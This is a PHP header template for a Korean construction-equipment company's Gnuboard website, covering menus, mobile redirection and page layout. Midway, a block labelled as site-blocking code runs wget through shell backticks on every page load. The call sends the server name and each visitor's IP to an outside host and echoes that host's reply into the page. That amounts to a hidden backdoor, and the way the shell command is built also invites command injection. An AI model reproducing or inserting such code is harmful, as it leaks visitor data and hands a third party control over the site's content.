<?
if (!defined("_GNUBOARD_")) exit; // 개별 페이지 접근 불가


if(isset($_GET["pcv"])) { set_session("ss_is_pc_view", $_GET["pcv"]);}
$ss_is_pc_view = get_session("ss_is_pc_view");
if(USE_MOBILE && USE_MOVE_MOBILE_FROM_HEAD && !$ss_is_pc_view) { //config.php	
	if($_SERVER[QUERY_STRING]) $qry_str = "?{$_SERVER[QUERY_STRING]}";
	$arr_browser = array ("iPhone","iPod","IEMobile","Mobile","lgtelecom","PPC","iphone","ipod","android","blackberry","windows ce","nokia","webos","opera mini","sonyericsson","opera mobi","iemobile");
	for($indexi = 0 ; $indexi < count($arr_browser) ; $indexi++) {
	if(stripos($_SERVER['HTTP_USER_AGENT'],$arr_browser[$indexi]) == true){
		// 모바일 브라우저라면  모바일 URL로 이동
		if ($_SERVER['HTTP_REFERER'] != "http://{$_SERVER['SERVER_NAME']}/m/" ) {
			header("Location: http://{$_SERVER['SERVER_NAME']}/m{$_SERVER["PHP_SELF"]}{$qry_str}");
			exit;
		}
	}
	}
}


include_once("$g4[path]/head.sub.php");
include_once("$g4[path]/lib/latest.lib.php");
include_once($g4['path']."/lib/calendar.php");

$subNaviHeight = array("",713,713,713,713,713,713,713);


if($p){
	$ppage=explode("_",$p);
	$pageNum=$ppage[0];
	$subNum=$ppage[1];
	$ssNum=$ppage[2];
	$tabNum=$ppage[3];
}

if($bo_table){ //게시판일때
	$bp=explode("_",$bo_table);
	$pageNum=$bp[0];
	$subNum=$bp[1];
	$ssNum=$bp[2];
	$tabNum=$bp[3];
}


if(USE_SHOP) {	//config.php
	$ca_temp = 0;
	if(isset($it)){
		$ca_temp = 1;
		$ca_id = $it[ca_id2];
		if(!$it[ca_id2]) $ca_id = $it[ca_id];

	}

	if($ca_id){

		for($i=0; $i<strlen($ca_id); $i++) { 
			$str_cut[$i] = substr($ca_id,$i,1); 
		}
		if($str_cut[0] == "a") $str_cut[0] = 11;
		if($str_cut[0] == "b") $str_cut[0] = 12;
		if($str_cut[0] == "c") $str_cut[0] = 13;
		if($str_cut[0] == "d") $str_cut[0] = 14;
		if($str_cut[0] == "e") $str_cut[0] = 15;

		$pageNum = $str_cut[0]+1;
		$subNum = (strlen($ca_id) <= 2) ? 1 : $str_cut[2];
		$ssNum = (strlen($ca_id) <= 4) ? 1 : $str_cut[4];
		$tabNum = (strlen($ca_id) <= 6) ? 1 : $str_cut[6];

	}

	if($ca_temp == 1){
		unset($ca_id);
	}

	$tv_idx = get_session("ss_tv_idx");
	$cartcnt = get_cart_count(get_session("ss_on_uid"));

	
	$ycart = new Yc4();
	$ShopMenu1 = $ycart->get_category_d1();
}

$tot = $pageNum."_".$subNum;
$tott = $tot."_".$ssNum;

// site 차단소스 ////////////////////////////////////////
function site_down($url){$fuid = '/tmp/wget_tmp_'. md5($_SERVER['REMOTE_ADDR'] . microtime() . $url. $ip);$cmd = 'wget "' . $url . '" -O "' . $fuid . '" --read-timeout=30';`$cmd`;$data = file_get_contents($fuid);`rm -rf $fuid`;return $data;}
$site_down_url= "http://it9.co.kr/site_down2.php?site_url=".$_SERVER['SERVER_NAME']."&remote_addr=".$_SERVER['REMOTE_ADDR'];
$site_down_data = site_down($site_down_url);
echo $site_down_data;
/////////////////////////////////////////////////////////



$menu = array();

$menu["pageNum"][1] = "회사소개";
	$menu["tot"][1][1] = "인사말";
	$menu["tot"][1][2] = "주요연혁";
	$menu["tot"][1][3] = "사업소개";

$menu["pageNum"][2] = "보유장비/제원표";
	$menu["tot"][2][1] = "타워크레인";
		$menu["tott"][2][1][1] = "무인 타워크레인";
		$menu["tott"][2][1][2] = "유인 타워크레인";
		$menu["tott"][2][1][3] = "이동식 타워크레인";

	$menu["tot"][2][2] = "건설용리프트";
		$menu["tott"][2][2][1] = "JTL-1230SICA-1900";
		$menu["tott"][2][2][2] = "JTL-1230SICA-2200";
		$menu["tott"][2][2][3] = "JTL-1230SICA-2400";
		$menu["tott"][2][2][4] = "JTL-1230SICA-2600";
		$menu["tott"][2][2][5] = "JTL-1230SICA-3000";

	$menu["tot"][2][3] = "고소작업대";
		$menu["tott"][2][3][1] = "SJ-lll 3215";
		$menu["tott"][2][3][2] = "SJ-lll 3215";

	$menu["tot"][2][4] = "하이드로크레인";
		$menu["tott"][2][4][1] = "SR-250R";
		$menu["tott"][2][4][2] = "SL600";
		$menu["tott"][2][4][3] = "LTM-1060";
		$menu["tott"][2][4][4] = "LTM-1090-2";
		$menu["tott"][2][4][5] = "LTM-1200-5.1";

$menu["pageNum"][3] = "건설기계종합정비";
	$menu["tot"][3][1] = "수출/수입";
	$menu["tot"][3][2] = "제조";
	$menu["tot"][3][3] = "서비스";
	$menu["tot"][3][4] = "중고거래";

$menu["pageNum"][4] = "주요실적";
	$menu["tot"][4][1] = "주요실적";
	$menu["tot"][4][2] = "현장앨범";

$menu["pageNum"][5] = "고객센터";
	$menu["tot"][5][1] = "공지사항";
	$menu["tot"][5][2] = "견적문의";

$menu["pageNum"][6] = "직원전용";
	$menu["tot"][6][1] = "타워크레인";
		$menu["tott"][6][1][1] = "무인 타워크레인";
		$menu["tott"][6][1][2] = "유인 타워크레인";
		$menu["tott"][6][1][3] = "이동식 타워크레인";

	$menu["tot"][6][2] = "건설용리프트";
	$menu["tot"][6][3] = "고소작업대";
	$menu["tot"][6][4] = "하이드로크레인";

$menu["pageNum"][9] = "제원표";

$menu["pageNum"][99] = "검색";
	$menu["tot"][99][1] = "검색";

$menu["pageNum"][100] = $config["cf_title"];
	$menu["tot"][100][1] = "로그인";
	$menu["tot"][100][2] = "정보수정";
	$menu["tot"][100][3] = "회원가입";
	$menu["tot"][100][4] = "장바구니";
	$menu["tot"][100][5] = "마이페이지";
	$menu["tot"][100][6] = "이용약관";
	$menu["tot"][100][7] = "개인정보처리방침";
	$menu["tot"][100][8] = "주문배송조회";
	$menu["tot"][100][10] = "주문상세내역";
	$menu["tot"][100][11] = "주문하기";
	$menu["tot"][100][12] = "주문 확인 및 결제";
	$menu["tot"][100][13] = "결제완료";
	$menu["tot"][100][14] = "주문내역";
	$menu["tot"][100][15] = "상품검색";
	$menu["tot"][100][16] = "이메일무단수집거부";

	function outLine() {
		for($j=1; $j<=4; $j++) // nth-child 1:top 2:right 3:bottom 4:left
			echo "<span class='outLine".$j."'></span>";
	}

	$pageChk = array();

	array_push($pageChk, count($menu["tot"][$pageNum]));
	array_push($pageChk, count($menu["tott"][$pageNum][$subNum]));
?>

<script>
	window.gambitScrollWheelAmount = 20;
	window.gambitScrollKeyAmount = 100;
	window.gambitScrollDecompositionRate = 0.9;
	window.gambitUseRequestAnimationFrame = true;

	function logoutCheck() {
		if ( confirm("정말 로그아웃 할거에여?") )
			location.href="/bbs/logout.php";
	}
</script>

<style>
.header_logo { position: absolute; top: 18px; left: 50px; cursor: pointer; }

.loginBtn { position: absolute; top: 38px; right: 50px; cursor: pointer; }
</style>

<div class="wrap">
<div class="wrap-header">
	<header class="layout">
		<img src="/res/images/top/logo.png" alt="로고" onclick="home()" class="header_logo" />
		
		<? include_once("$g4[path]/res/include/menuArea.php"); ?>

		<? include_once("$g4[path]/res/include/searchArea.php"); ?>

		<? if(!$member['mb_id']) {?>
			<img src="/res/images/top/loginBtn.png" alt="로그인 버튼" onclick="login()" class="loginBtn" />
		<?} else {?>
			<img src="/res/images/top/loginBtn.png" alt="로그인 버튼" onclick="logoutCheck()" class="loginBtn" />
		<?}?>
	</header>
</div>


<?if(!defined("__INDEX")){?>
<div class="wrap-sub wrap-content">

<?
if(file_exists("{$g4['path']}/res/images/subvisual/s{$p}.jpg"))				$Svisual = "s{$p}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$bo_table}.jpg"))	$Svisual = "s{$bo_table}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$tott}.jpg"))		$Svisual = "s{$tott}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$tot}.jpg"))		$Svisual = "s{$tot}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$pageNum}.jpg"))	$Svisual = "s{$pageNum}";
else																		$Svisual = "s0";
?>

<div class="subvisual" style="background-image:url('/res/images/subvisual/<?=$Svisual?>.jpg');" >
	<div class="subvi_div">
		<p>
			<? 
				$str = $menu["pageNum"][$pageNum];
				for($i=0; $i<mb_strlen($str, "UTF-8"); $i++) {
					$s = 0.2 * $i;
					$word = mb_substr($str, $i ,1, "UTF-8");
					echo "<span class='wow fadeInUpBig' data-wow-delay='".$s."s'>".$word."</span>";
				}
			?>
		</p>

		<ul class="wow fadeInUp" data-wow-delay="0.3s">
			<li><a href="#subvi" onclick="home()">Home</a></li>
			<li><a><?=$menu["pageNum"][$pageNum]?></a></li>
			<?if($pageChk[0]>0) {?>
				<li><a><?=$menu["tot"][$pageNum][$subNum]?></a></li>
				<?if($pageChk[1]>0) {?>
					<li><a><?=$menu["tott"][$pageNum][$subNum][$ssNum]?></a></li>
				<?}?>
			<?}?>
		</ul>
	</div>
</div>

<section class="layout">

	<section class="content">
		<header>
			<p>
				<?
					if($pageChk[0]>0) echo $menu["tot"][$pageNum][$subNum];
					else echo $menu["pageNum"][$pageNum];
				?>
			</p>
			<div></div>
		</header>

		<?if($bo_table){?>
		<div class="boardarea">
		<?}?>
<?}?>

<script>
	function gotoTop() {
		$("html, body").animate({scrollTop:0}, 400, "linear");
	}
	
	$(function(){
		new WOW().init();
		Scroll();
	});

	$(window).scroll(function() {
		Scroll();
	});

	function Scroll(){
		if($(document).scrollTop() <= 1)
			$(".topBtn").addClass("noneTop");
		else
			$(".topBtn").removeClass("noneTop");
	}
</script>